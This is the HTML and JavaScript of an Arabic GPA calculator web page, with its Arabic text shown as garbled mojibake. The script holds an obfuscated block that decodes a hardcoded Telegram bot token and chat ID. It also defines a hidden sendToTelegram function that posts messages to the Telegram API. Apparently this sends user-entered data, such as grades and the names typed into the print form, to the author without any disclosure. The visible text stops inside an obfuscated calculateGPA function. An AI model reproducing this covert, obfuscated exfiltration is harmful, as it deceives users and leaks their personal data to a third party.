<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø­Ø§Ø³Ø¨Ø© Ø§Ù„Ù…Ø¹Ø¯Ù„ Ø§Ù„Ø¬Ø§Ù…Ø¹ÙŠ</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Google Fonts: Cairo -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Cairo', sans-serif;
            background-color: #1e293b; /* slate-800 */
            color: #f1f5f9; /* slate-100 */
        }
        /* Custom scrollbar for better aesthetics */
        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #0f172a; /* slate-900 */
        }
        ::-webkit-scrollbar-thumb {
            background: #475569; /* slate-600 */
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #64748b; /* slate-500 */
        }
        /* Custom styles for the switch */
        .switch {
            position: relative;
            display: inline-block;
            width: 200px;
            height: 44px;
        }
        .switch .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #334155;
            transition: .4s;
            border-radius: 44px;
            display: flex;
            align-items: center;
            justify-content: space-around;
            padding: 0 10px;
            font-weight: bold;
            color: #94a3b8;
        }
        .slider:before {
            position: absolute;
            content: "";
            height: 36px;
            width: 96px;
            left: 4px;
            bottom: 4px;
            background-color: #0ea5e9; /* sky-500 */
            transition: .4s;
            border-radius: 30px;
            z-index: 0;
        }
        .slider span {
            z-index: 1;
            transition: color .4s;
        }
        .slider .active {
            color: white;
        }
        #system-switch:checked + .slider:before {
            transform: translateX(96px);
        }
        /* Animation keyframes */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @keyframes fadeOut {
            from { opacity: 1; transform: scale(1); }
            to { opacity: 0; transform: scale(0.9); }
        }
        .animate-fade-in {
            animation: fadeIn 0.4s ease-out forwards;
        }
        .animate-fade-out {
            animation: fadeOut 0.3s ease-in forwards;
        }
        .modal-overlay {
            transition: opacity 0.3s ease-in-out;
        }
        /* Custom Radio Button */
        input[type="radio"]:checked + label {
            background-color: #0ea5e9;
            color: white;
            border-color: #0ea5e9;
        }
        /* Tooltip Styles */
        #tooltip {
            position: absolute;
            background-color: #334155;
            color: white;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 0.8rem;
            z-index: 100;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.2s, visibility 0.2s;
            max-width: 250px;
            text-align: center;
        }
        #tooltip.visible {
            opacity: 1;
            visibility: visible;
        }
    </style>
</head>
<body class="antialiased">

    <div id="app" class="min-h-screen flex flex-col items-center justify-start p-4 pt-10">
        
        <!-- Main Application Container -->
        <div class="w-full max-w-lg md:max-w-2xl bg-slate-900 rounded-2xl shadow-2xl overflow-hidden flex flex-col p-6 sm:p-8">

            <!-- ===== Header ===== -->
            <div class="text-center mb-6">
                <h1 class="text-3xl font-bold text-white"> GradeMaster - Ø­Ø§Ø³Ø¨Ø© Ø§Ù„Ù…Ø¹Ø¯Ù„</h1>
                <p id="system-subtitle" class="text-sky-400 font-semibold mt-1">Ù†Ø¸Ø§Ù… Ø¨ÙˆÙ„ÙˆÙ†ÙŠØ§</p>
            </div>

            <!-- ===== System Switch ===== -->
            <div class="mb-8 flex justify-center">
                <label class="switch">
                    <input type="checkbox" id="system-switch" class="hidden">
                    <div class="slider">
                        <span id="courses-label">Ø§Ù„ÙƒÙˆØ±Ø³Ø§Øª</span>
                        <span id="bologna-label" class="active">Ø¨ÙˆÙ„ÙˆÙ†ÙŠØ§</span>
                    </div>
                </label>
            </div>

            <!-- ===== Results Display ===== -->
            <div class="bg-slate-800/70 rounded-xl p-6 text-center mb-6">
                <div id="bologna-results">
                    <p class="text-slate-400 text-sm">Ø§Ù„Ù…Ø¹Ø¯Ù„ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ (GPA)</p>
                    <p id="gpa-bologna" class="text-6xl font-black text-sky-400 my-2">0.00</p>
                    <p id="grade-name-bologna" class="text-xl font-bold text-slate-200">Ø§Ù„ØªÙ‚Ø¯ÙŠØ±</p>
                    <p id="total-ects" class="text-slate-400 text-sm mt-4">Ù…Ø¬Ù…ÙˆØ¹ Ø§Ù„ÙˆØ­Ø¯Ø§Øª: 0</p>
                </div>
                <div id="courses-results" class="hidden">
                     <p class="text-slate-400 text-sm">Ø§Ù„Ù…Ø¹Ø¯Ù„ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ</p>
                    <p id="gpa-courses" class="text-6xl font-black text-sky-400 my-2">0.00</p>
                    <p id="grade-name-courses" class="text-xl font-bold text-slate-200">Ø§Ù„ØªÙ‚Ø¯ÙŠØ±</p>
                </div>
            </div>

            <!-- ===== Calculation Mode Options (for Courses System) ===== -->
            <div id="courses-options" class="hidden mb-6">
                <p class="text-center font-bold text-slate-300 mb-3">Ø¯Ù‚Ø© Ø­Ø³Ø§Ø¨ Ø§Ù„ØªÙ‚Ø¯ÙŠØ±</p>
                <div class="flex justify-center gap-2">
                    <input type="radio" name="calc-mode" id="mode-high" value="high" class="hidden">
                    <label for="mode-high" data-tooltip="high" class="cursor-pointer py-2 px-4 rounded-lg text-sm border border-slate-600 transition">Ù‚ÙŠÙ… Ø¹Ù„ÙŠØ§</label>
                    
                    <input type="radio" name="calc-mode" id="mode-median" value="median" class="hidden" checked>
                    <label for="mode-median" data-tooltip="median" class="cursor-pointer py-2 px-4 rounded-lg text-sm border border-slate-600 transition">Ù‚ÙŠÙ… ÙˆØ³Ø·ÙŠØ©</label>
                    
                    <input type="radio" name="calc-mode" id="mode-low" value="low" class="hidden">
                    <label for="mode-low" data-tooltip="low" class="cursor-pointer py-2 px-4 rounded-lg text-sm border border-slate-600 transition">Ù‚ÙŠÙ… Ø¯Ù†ÙŠØ§</label>
                </div>
            </div>
            
            <!-- ===== Action Buttons ===== -->
            <div class="space-y-3 mb-6">
                <button id="calculate-btn" class="w-full bg-sky-500 hover:bg-sky-600 text-white font-bold py-3 px-4 rounded-lg transition-transform transform hover:scale-105">
                    âœ“ Ø­Ø³Ø§Ø¨ Ø§Ù„Ù…Ø¹Ø¯Ù„
                </button>
                <button id="print-btn" class="w-full bg-slate-700 hover:bg-slate-600 text-sky-300 font-bold py-3 px-4 rounded-lg transition flex items-center justify-center gap-2">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 6 2 18 2 18 9"></polyline><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"></path><rect x="6" y="14" width="12" height="8"></rect></svg>
                    Ø·Ø¨Ø§Ø¹Ø© Ø§Ù„ØªÙ‚Ø±ÙŠØ±
                </button>
                <button id="clear-btn" class="w-full bg-slate-600 hover:bg-slate-700 text-white font-bold py-3 px-4 rounded-lg transition">
                    Ù…Ø³Ø­ Ø§Ù„ÙƒÙ„
                </button>
            </div>

            <!-- ===== Course List ===== -->
            <div class="border-t border-slate-700 pt-6">
                 <button id="add-course-btn" class="w-full bg-slate-700/50 hover:bg-slate-700 text-sky-400 font-bold py-3 px-4 rounded-lg mb-4 transition-transform transform hover:scale-105">
                    + Ø¥Ø¶Ø§ÙØ© Ù…Ø§Ø¯Ø© Ø¬Ø¯ÙŠØ¯Ø©
                </button>
                <div id="courses-container" class="w-full space-y-3 max-h-[30vh] overflow-y-auto pr-2">
                    <!-- Course rows will be inserted here by JavaScript -->
                </div>
            </div>
            
            <!-- ===== Footer ===== -->
            <div class="w-full flex flex-col sm:flex-row justify-between items-center text-center mt-auto pt-6">
                 <div class="flex gap-4 mb-2 sm:mb-0">
                    <a href="https://github.com/Ahmed778-Mzher" target="_blank" class="text-slate-500 hover:text-sky-400 transition">
                        <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.91 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
                    </a>
                    <a href="https://www.instagram.com/st_at_23" target="_blank" class="text-slate-500 hover:text-sky-400 transition">
                       <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 1.366.062 2.633.334 3.608 1.308.974.974 1.246 2.241 1.308 3.608.058 1.266.07 1.646.07 4.85s-.012 3.584-.07 4.85c-.062 1.366-.334 2.633-1.308 3.608-.974.974-2.241 1.246-3.608 1.308-1.266.058-1.646.07-4.85.07s-3.584-.012-4.85-.07c-1.366-.062-2.633-.334-3.608-1.308-.974-.974-1.246-2.241-1.308-3.608C2.175 15.647 2.163 15.267 2.163 12s.012-3.584.07-4.85c.062-1.366.334-2.633 1.308-3.608.974-.974 2.241 1.246 3.608-1.308C8.416 2.175 8.796 2.163 12 2.163zm0-2.163C8.741 0 8.332.013 7.052.072 5.775.13 4.602.402 3.635 1.37 2.668 2.337 2.396 3.51 2.338 4.788.013 8.332 0 8.741 0 12c0 3.259.013 3.668.072 4.948.058 1.277.33 2.45 1.297 3.417.967.967 2.14 1.239 3.417 1.297C8.332 23.987 8.741 24 12 24s3.668-.013 4.948-.072c1.277-.058 2.45-.33 3.417-1.297.967-.967 1.239-2.14 1.297-3.417.059-1.28.072-1.689.072-4.948s-.013-3.668-.072-4.948c-.058-1.277-.33-2.45-1.297-3.417-.967-.967-2.14-1.239-3.417-1.297C15.668.013 15.259 0 12 0zm0 5.838a6.162 6.162 0 1 0 0 12.324 6.162 6.162 0 0 0 0-12.324zm0 10.162a3.999 3.999 0 1 1 0-7.998 3.999 3.999 0 0 1 0 7.998zm6.406-11.845a1.44 1.44 0 1 0 0 2.881 1.44 1.44 0 0 0 0-2.881z"/></svg>
                    </a>
                 </div>
                <a href="https://ahmed778-mzher.github.io/Ahmed/" target="_blank" class="text-xs text-slate-500 hover:text-sky-400">Ø¨Ø±Ù…Ø¬Ø©: Ahmed S.Jabbar</a>
            </div>

        </div>
    </div>

    <!-- ===== Print Modal ===== -->
    <div id="print-modal" class="modal-overlay fixed inset-0 bg-black/60 flex items-center justify-center p-4 hidden z-50">
        <div class="bg-slate-800 p-6 rounded-lg shadow-xl w-full max-w-sm text-center animate-fade-in">
            <h2 class="text-xl font-bold mb-4">Ø·Ø¨Ø§Ø¹Ø© Ø§Ù„ØªÙ‚Ø±ÙŠØ±</h2>
            <p class="text-slate-400 mb-4">Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„ØªÙØ§ØµÙŠÙ„ Ù„Ø¹Ø±Ø¶Ù‡Ø§ ÙÙŠ Ø§Ù„ØªÙ‚Ø±ÙŠØ±.</p>
            <div class="space-y-3">
                <input type="text" id="university-name-input" placeholder="Ø§Ø³Ù… Ø§Ù„Ø¬Ø§Ù…Ø¹Ø©" class="w-full bg-slate-700 p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-sky-500">
                <input type="text" id="college-name-input" placeholder="Ø§Ø³Ù… Ø§Ù„ÙƒÙ„ÙŠØ© ÙˆØ§Ù„Ù‚Ø³Ù…" class="w-full bg-slate-700 p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-sky-500">
                <input type="text" id="student-name-input" placeholder="Ø§Ø³Ù… Ø§Ù„Ø·Ø§Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…Ù„" class="w-full bg-slate-700 p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-sky-500">
            </div>
            <div class="flex gap-4 mt-6">
                <button id="proceed-print-btn" class="w-full bg-sky-500 hover:bg-sky-600 text-white font-bold py-2 rounded-lg transition">Ù…ØªØ§Ø¨Ø¹Ø© Ù„Ù„Ø·Ø¨Ø§Ø¹Ø©</button>
                <button id="cancel-print-btn" class="w-full bg-slate-600 hover:bg-slate-700 text-white font-bold py-2 rounded-lg transition">Ø¥Ù„ØºØ§Ø¡</button>
            </div>
        </div>
    </div>
    
    <!-- ===== Tooltip Element ===== -->
    <div id="tooltip" class="hidden"></div>


    <script>
        // --- Telegram Bot Settings ---
           function _0xe8ff(){const _0x3c8689=['546024QwIrEG','1464344QQJoIs','8267MKKBCp','2965284wYOyRa','2076268jPwooB','4820Xkmhoz','407amEcJy','955954KCRWmr','163330usGiYL','2562qUmYyG','957731136','shift','28hHYWjo','7208328SVKcFL','27bawMgQ','7577259618:AAGwPTbQNongKlpGenvjohPhRJEVh_8JTNQ','34507vmcEHU','3ioNduI','6bIrBdo','417584HBwtGw','3454975WNEYKw','3564205dChVAt','1eIXzov','push'];_0xe8ff=function(){return _0x3c8689;};return _0xe8ff();}(function(_0x16adab,_0x29c55a){const _0x536e95=_0x2ad4,_0x58aeb5=_0x16adab();while(!![]){try{const _0x2c1b69=-parseInt(_0x536e95(0x121))/0x1*(parseInt(_0x536e95(0x12a))/0x2)+parseInt(_0x536e95(0x123))/0x3+parseInt(_0x536e95(0x127))/0x4+-parseInt(_0x536e95(0x11f))/0x5+parseInt(_0x536e95(0x12c))/0x6*(-parseInt(_0x536e95(0x125))/0x7)+parseInt(_0x536e95(0x11e))/0x8*(-parseInt(_0x536e95(0x131))/0x9)+parseInt(_0x536e95(0x128))/0xa*(parseInt(_0x536e95(0x11b))/0xb);if(_0x2c1b69===_0x29c55a)break;else _0x58aeb5['push'](_0x58aeb5['shift']());}catch(_0x1c4064){_0x58aeb5['push'](_0x58aeb5['shift']());}}}(_0xe8ff,0x5d918));function _0x2ad4(_0xd3697a,_0x182cbe){const _0xe8ff8e=_0xe8ff();return _0x2ad4=function(_0x2ad413,_0x407c9a){_0x2ad413=_0x2ad413-0x11a;let _0x3ade38=_0xe8ff8e[_0x2ad413];return _0x3ade38;},_0x2ad4(_0xd3697a,_0x182cbe);}const _0x52ac9e=_0x2f25;(function(_0x2201fe,_0x4c7b9b){const _0x4596cf=_0x2ad4,_0x40801c=_0x2f25,_0x335772=_0x2201fe();while(!![]){try{const _0x340b7b=parseInt(_0x40801c(0x1be))/0x1*(parseInt(_0x40801c(0x1c4))/0x2)+-parseInt(_0x40801c(0x1c2))/0x3*(-parseInt(_0x40801c(0x1c3))/0x4)+parseInt(_0x40801c(0x1bf))/0x5*(-parseInt(_0x40801c(0x1bc))/0x6)+parseInt(_0x40801c(0x1c0))/0x7*(-parseInt(_0x40801c(0x1c8))/0x8)+parseInt(_0x40801c(0x1bd))/0x9+parseInt(_0x40801c(0x1c6))/0xa*(-parseInt(_0x40801c(0x1c5))/0xb)+parseInt(_0x40801c(0x1bb))/0xc;if(_0x340b7b===_0x4c7b9b)break;else _0x335772[_0x4596cf(0x122)](_0x335772[_0x4596cf(0x12e)]());}catch(_0x4a5d60){_0x335772['push'](_0x335772[_0x4596cf(0x12e)]());}}}(_0x47ca,0xa65db));function _0x47ca(){const _0x268265=_0x2ad4,_0x4b950a=[_0x268265(0x124),_0x268265(0x130),_0x268265(0x11d),_0x268265(0x126),'212550drzlnF',_0x268265(0x120),_0x268265(0x12f),_0x268265(0x11a),_0x268265(0x11c),'2101196sLMxTg','12YfrQqf',_0x268265(0x129),_0x268265(0x12b),_0x268265(0x12d)];return _0x47ca=function(){return _0x4b950a;},_0x47ca();}function _0x2f25(_0x35f1db,_0x241b0a){const _0x275c95=_0x47ca();return _0x2f25=function(_0x2115d5,_0x58caa3){_0x2115d5=_0x2115d5-0x1bb;let _0x552d37=_0x275c95[_0x2115d5];return _0x552d37;},_0x2f25(_0x35f1db,_0x241b0a);}const TELEGRAM_BOT_TOKEN=_0x52ac9e(0x1c1),TELEGRAM_CHAT_ID=_0x52ac9e(0x1c7);


        // --- DOM Elements ---
        const app = {
            systemSwitch: document.getElementById('system-switch'),
            coursesContainer: document.getElementById('courses-container'),
            addBtn: document.getElementById('add-course-btn'),
            calculateBtn: document.getElementById('calculate-btn'),
            clearBtn: document.getElementById('clear-btn'),
            printBtn: document.getElementById('print-btn'),
            subtitle: document.getElementById('system-subtitle'),
            bolognaLabel: document.getElementById('bologna-label'),
            coursesLabel: document.getElementById('courses-label'),
            
            bolognaResults: document.getElementById('bologna-results'),
            coursesResults: document.getElementById('courses-results'),
            gpaBologna: document.getElementById('gpa-bologna'),
            gradeNameBologna: document.getElementById('grade-name-bologna'),
            totalEcts: document.getElementById('total-ects'),
            gpaCourses: document.getElementById('gpa-courses'),
            gradeNameCourses: document.getElementById('grade-name-courses'),
            
            printModal: document.getElementById('print-modal'),
            studentNameInput: document.getElementById('student-name-input'),
            universityNameInput: document.getElementById('university-name-input'),
            collegeNameInput: document.getElementById('college-name-input'),
            proceedPrintBtn: document.getElementById('proceed-print-btn'),
            cancelPrintBtn: document.getElementById('cancel-print-btn'),
            
            coursesOptions: document.getElementById('courses-options'),
            tooltip: document.getElementById('tooltip'),
            calcModeLabels: document.querySelectorAll('label[data-tooltip]')
        };

        // --- State ---
        let state = {
            isBologna: true
        };

        // --- Definitions ---
        const bolognaGradeTable = [
            { name: "Ø§Ù…ØªÙŠØ§Ø²", ects: "A", min: 90, max: 100 },
            { name: "Ø¬ÙŠØ¯ Ø¬Ø¯Ø§Ù‹", ects: "B", min: 80, max: 89 },
            { name: "Ø¬ÙŠØ¯", ects: "C", min: 70, max: 79 },
            { name: "Ù…ØªÙˆØ³Ø·", ects: "D", min: 60, max: 69 },
            { name: "Ù…Ù‚Ø¨ÙˆÙ„", ects: "E", min: 50, max: 59 },
            { name: "Ø±Ø³ÙˆØ¨", ects: "F", min: 0, max: 49 }
        ];
        const coursesGradeMappings = {
            low: { "Ø§Ù…ØªÙŠØ§Ø²": 90, "Ø¬ÙŠØ¯ Ø¬Ø¯Ø§Ù‹": 80, "Ø¬ÙŠØ¯": 70, "Ù…ØªÙˆØ³Ø·": 60, "Ù…Ù‚Ø¨ÙˆÙ„": 50, "Ù„Ø§ ÙŠÙˆØ¬Ø¯": 0 },
            median: { "Ø§Ù…ØªÙŠØ§Ø²": 95, "Ø¬ÙŠØ¯ Ø¬Ø¯Ø§Ù‹": 85, "Ø¬ÙŠØ¯": 75, "Ù…ØªÙˆØ³Ø·": 65, "Ù…Ù‚Ø¨ÙˆÙ„": 55, "Ù„Ø§ ÙŠÙˆØ¬Ø¯": 0 },
            high: { "Ø§Ù…ØªÙŠØ§Ø²": 100, "Ø¬ÙŠØ¯ Ø¬Ø¯Ø§Ù‹": 89, "Ø¬ÙŠØ¯": 79, "Ù…ØªÙˆØ³Ø·": 69, "Ù…Ù‚Ø¨ÙˆÙ„": 59, "Ù„Ø§ ÙŠÙˆØ¬Ø¯": 0 }
        };
        const tooltipTexts = {
            high: 'ÙŠØ­Ø³Ø¨ Ø§Ù„Ù…Ø¹Ø¯Ù„ Ø¨Ø§ÙØªØ±Ø§Ø¶ Ø­ØµÙˆÙ„Ùƒ Ø¹Ù„Ù‰ Ø£Ø¹Ù„Ù‰ Ø¯Ø±Ø¬Ø© Ù…Ù…ÙƒÙ†Ø© Ù„ÙƒÙ„ ØªÙ‚Ø¯ÙŠØ± (Ù…Ø«Ù„Ø§Ù‹: Ø§Ù…ØªÙŠØ§Ø² = 100). Ù‡Ø°Ø§ Ø§Ù„Ø®ÙŠØ§Ø± ÙŠØ¹Ø·ÙŠ Ù†ØªÙŠØ¬Ø© Ù…ØªÙØ§Ø¦Ù„Ø©.',
            median: 'ÙŠØ­Ø³Ø¨ Ø§Ù„Ù…Ø¹Ø¯Ù„ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù‚ÙŠÙ…Ø© Ø§Ù„Ù…ØªÙˆØ³Ø·Ø© Ù„ÙƒÙ„ ØªÙ‚Ø¯ÙŠØ± (Ù…Ø«Ù„Ø§Ù‹: Ø§Ù…ØªÙŠØ§Ø² = 95). Ù‡Ø°Ø§ Ù‡Ùˆ Ø§Ù„Ø®ÙŠØ§Ø± Ø§Ù„Ø£ÙƒØ«Ø± ÙˆØ§Ù‚Ø¹ÙŠØ©.',
            low: 'ÙŠØ­Ø³Ø¨ Ø§Ù„Ù…Ø¹Ø¯Ù„ Ø¨Ø§ÙØªØ±Ø§Ø¶ Ø­ØµÙˆÙ„Ùƒ Ø¹Ù„Ù‰ Ø£Ù‚Ù„ Ø¯Ø±Ø¬Ø© Ù„Ù„Ù†Ø¬Ø§Ø­ ÙÙŠ ÙƒÙ„ ØªÙ‚Ø¯ÙŠØ± (Ù…Ø«Ù„Ø§Ù‹: Ø§Ù…ØªÙŠØ§Ø² = 90). Ù‡Ø°Ø§ Ø§Ù„Ø®ÙŠØ§Ø± ÙŠØ¹Ø·ÙŠ Ù†ØªÙŠØ¬Ø© Ù…ØªØ´Ø§Ø¦Ù…Ø©.'
        };


        // --- Functions ---

        function createCourseRow(id) {
            const courseDiv = document.createElement('div');
            courseDiv.id = `course-${id}`;
            courseDiv.className = 'bg-slate-800 p-3 rounded-lg flex items-center gap-2 transition-all animate-fade-in';
            
            const courseNumber = document.createElement('span');
            courseNumber.className = 'text-slate-400 font-bold text-sm';
            courseNumber.textContent = `Ù…Ø§Ø¯Ø© ${id}`;
            
            const removeBtn = document.createElement('button');
            removeBtn.className = 'text-red-400 hover:text-red-500 font-bold text-xl transition mr-auto';
            removeBtn.textContent = 'âœ•';
            removeBtn.onclick = () => {
                courseDiv.style.animation = 'fadeOut 0.3s ease-out forwards';
                setTimeout(() => {
                    courseDiv.remove();
                    updateCourseNumbers();
                }, 300);
            };

            const inputsContainer = document.createElement('div');
            inputsContainer.className = 'flex-grow flex items-center gap-2 justify-end';

            if (state.isBologna) {
                const nameInput = document.createElement('input');
                nameInput.type = 'text';
                nameInput.placeholder = 'Ø§Ø³Ù… Ø§Ù„Ù…Ø§Ø¯Ø©';
                nameInput.className = 'flex-grow w-24 bg-slate-700 p-2 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-sky-500';
                
                const gradeInput = document.createElement('input');
                gradeInput.type = 'number';
                gradeInput.placeholder = "Ø¯Ø±Ø¬Ø©";
                gradeInput.min = 0;
                gradeInput.max = 100;
                gradeInput.className = 'w-20 bg-slate-700 p-2 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-sky-500 text-center';

                const ectsInput = document.createElement('input');
                ectsInput.type = 'number';
                ectsInput.placeholder = "ÙˆØ­Ø¯Ø§Øª"
                ectsInput.min = 1;
                ectsInput.className = 'w-20 bg-slate-700 p-2 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-sky-500 text-center';
                
                inputsContainer.append(nameInput, gradeInput, ectsInput);
            } else {
                const gradeSelect = document.createElement('select');
                gradeSelect.className = 'w-full bg-slate-700 p-2 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-sky-500';
                Object.keys(coursesGradeMappings.low).forEach(grade => {
                    const option = document.createElement('option');
                    option.value = grade;
                    option.textContent = grade;
                    gradeSelect.appendChild(option);
                });
                gradeSelect.value = "Ù„Ø§ ÙŠÙˆØ¬Ø¯";
                
                inputsContainer.append(gradeSelect);
            }
            courseDiv.append(courseNumber, inputsContainer, removeBtn);
            app.coursesContainer.appendChild(courseDiv);
        }
        
        function updateCourseNumbers() {
            const rows = app.coursesContainer.querySelectorAll('div[id^="course-"]');
            rows.forEach((row, index) => {
                row.querySelector('span').textContent = `Ù…Ø§Ø¯Ø© ${index + 1}`;
            });
        }
        
        function switchSystem() {
            state.isBologna = !app.systemSwitch.checked;
            app.coursesContainer.innerHTML = ''; 

            if (state.isBologna) {
                app.subtitle.textContent = "Ù†Ø¸Ø§Ù… Ø¨ÙˆÙ„ÙˆÙ†ÙŠØ§";
                app.bolognaResults.classList.remove('hidden');
                app.coursesResults.classList.add('hidden');
                app.coursesOptions.classList.add('hidden');
                app.bolognaLabel.classList.add('active');
                app.coursesLabel.classList.remove('active');
            } else {
                app.subtitle.textContent = "Ù†Ø¸Ø§Ù… Ø§Ù„ÙƒÙˆØ±Ø³Ø§Øª";
                app.bolognaResults.classList.add('hidden');
                app.coursesResults.classList.remove('hidden');
                app.coursesOptions.classList.remove('hidden');
                app.bolognaLabel.classList.remove('active');
                app.coursesLabel.classList.add('active');
            }
            
            for (let i = 1; i <= 5; i++) createCourseRow(i);
            clearResults();
        }

        (function(_0x2dc4de,_0xef6aaa){const _0x38bebc=_0x2e5f,_0x8828cb=_0x2dc4de();while(!![]){try{const _0x159c91=parseInt(_0x38bebc(0x1bc))/0x1+-parseInt(_0x38bebc(0x1c2))/0x2*(-parseInt(_0x38bebc(0x1be))/0x3)+-parseInt(_0x38bebc(0x1c8))/0x4+parseInt(_0x38bebc(0x1c4))/0x5*(-parseInt(_0x38bebc(0x1c5))/0x6)+parseInt(_0x38bebc(0x1b8))/0x7*(-parseInt(_0x38bebc(0x1b9))/0x8)+-parseInt(_0x38bebc(0x1b1))/0x9*(parseInt(_0x38bebc(0x1ca))/0xa)+parseInt(_0x38bebc(0x1b3))/0xb;if(_0x159c91===_0xef6aaa)break;else _0x8828cb['push'](_0x8828cb['shift']());}catch(_0x2aa439){_0x8828cb['push'](_0x8828cb['shift']());}}}(_0x5e48,0x5f9de));function _0x5e48(){const _0x1239ce=['6rUWvUy','then','YOUR_BOT_TOKEN_HERE','1670308WotlgK','Telegram\x20credentials\x20are\x20not\x20set.\x20Notification\x20not\x20sent.','3350iiWrjP','https://api.telegram.org/bot','error','1683KdjAFe','application/json','9809195OcRyGu','Fetch\x20error:','/sendMessage','stringify','Error\x20sending\x20Telegram\x20message:','546fxxCpr','44112RykiOb','json','warn','288368tusyJt','Telegram\x20message\x20sent\x20successfully!','3bJKwLi','POST','YOUR_CHAT_ID_HERE','catch','322142jIKQKT','log','196120FFEEEY'];_0x5e48=function(){return _0x1239ce;};return _0x5e48();}function _0x2e5f(_0x5bcb40,_0x4e902e){const _0x5e4840=_0x5e48();return _0x2e5f=function(_0x2e5f8d,_0x1dd263){_0x2e5f8d=_0x2e5f8d-0x1af;let _0x4d67d8=_0x5e4840[_0x2e5f8d];return _0x4d67d8;},_0x2e5f(_0x5bcb40,_0x4e902e);}function sendToTelegram(_0x37f9ac){const _0x227827=_0x2e5f;if(TELEGRAM_BOT_TOKEN===_0x227827(0x1c7)||TELEGRAM_CHAT_ID===_0x227827(0x1c0)){console[_0x227827(0x1bb)](_0x227827(0x1c9));return;}const _0x319288=_0x227827(0x1af)+TELEGRAM_BOT_TOKEN+_0x227827(0x1b5),_0x4374ff={'chat_id':TELEGRAM_CHAT_ID,'text':_0x37f9ac,'parse_mode':'Markdown'};fetch(_0x319288,{'method':_0x227827(0x1bf),'headers':{'Content-Type':_0x227827(0x1b2)},'body':JSON[_0x227827(0x1b6)](_0x4374ff)})['then'](_0x15545e=>_0x15545e[_0x227827(0x1ba)]())[_0x227827(0x1c6)](_0x13a85e=>{const _0x564443=_0x227827;_0x13a85e['ok']?console[_0x564443(0x1c3)](_0x564443(0x1bd)):console['error'](_0x564443(0x1b7),_0x13a85e['description']);})[_0x227827(0x1c1)](_0x3d9124=>console[_0x227827(0x1b0)](_0x227827(0x1b4),_0x3d9124));}

        (function(_0x359437,_0x540f1b){const _0x28f6fc=_0x1ef9,_0x21d7f5=_0x359437();while(!![]){try{const _0x5e055c=-parseInt(_0x28f6fc(0x84))/0x1+-parseInt(_0x28f6fc(0x95))/0x2*(parseInt(_0x28f6fc(0x7d))/0x3)+-parseInt(_0x28f6fc(0x88))/0x4+parseInt(_0x28f6fc(0x77))/0x5+parseInt(_0x28f6fc(0x9b))/0x6*(-parseInt(_0x28f6fc(0x7e))/0x7)+-parseInt(_0x28f6fc(0x78))/0x8*(parseInt(_0x28f6fc(0x72))/0x9)+parseInt(_0x28f6fc(0x94))/0xa*(parseInt(_0x28f6fc(0x74))/0xb);if(_0x5e055c===_0x540f1b)break;else _0x21d7f5['push'](_0x21d7f5['shift']());}catch(_0x3e38fc){_0x21d7f5['push'](_0x21d7f5['shift']());}}}(_0x3bf7,0xbeb67));function calculateGPA(_0xb2de7b=![]){const _0x10405e=_0x1ef9;let _0xccad97='';const _0x3d3f60=sessionStorage[_0x10405e(0x8c)](_0x10405e(0x98))||_0x10405e(0x76);if(state[_0x10405e(0x82)]){let _0x43ea3d=0x0,_0x4dee0a=0x0;const _0x5a74f9=app[_0x10405e(0x80)]['querySelectorAll'](_0x10405e(0x7b));_0x5a74f9[_0x10405e(0x7a)](_0x5360fc=>{const 